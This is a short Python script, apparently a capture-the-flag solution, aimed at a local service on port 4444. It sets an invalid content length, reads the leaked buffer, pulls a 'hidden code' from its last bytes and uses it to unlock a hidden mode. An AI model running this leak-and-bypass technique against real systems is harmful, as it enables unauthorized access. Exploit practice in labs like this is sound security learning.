from util import *
from functools import reduce

host = "127.0.0.1"
port = 4444

s = Socket(host, port)


def cmd():
    return s.recvuntil(b"cmd: ")


def send_n(n: int):
    s.send(f"{n}".encode("utf-8"))
    s.send(b"\n")


def enter_hidden_mode(code: int):
    s.send(b"1\n")
    s.recvuntil(b"hidden code: ")
    s.send(f"{code}\n".encode("utf-8"))
    return cmd()


def print_content():
    s.send(b"2\n")
    d = cmd().split(b"\r")[0].split(b" ")
    d.pop()
    d = reduce(lambda a, x: a + int(x, 16).to_bytes(1, "little"), d, b"")
    return d


def write_content(l: int, content: bytes):
    s.send(b"3\n")
    s.recvuntil(b"content length: ")
    s.send(f"{l}\n".encode("utf-8"))
    s.recvuntil(b"content: ")
    s.send(content + b"\n")
    return cmd()


def write_invalid_content_length(l: int):
    assert l > 32

    s.send(b"3\n")
    s.recvuntil(b"content length: ")
    s.send(f"{l}\n".encode("utf-8"))
    s.recvuntil(b"Invalid content length!")
    return cmd()


def main():
    s.connect()
    cmd()
    write_invalid_content_length(40)
    content = print_content()
    print(content)
    hidden_code = int.from_bytes(content[-4:], "little")
    print(f"hiddenCode = {hex(hidden_code)} = {hidden_code}")

    result = enter_hidden_mode(hidden_code)
    print(result)


if __name__ == "__main__":
    main()
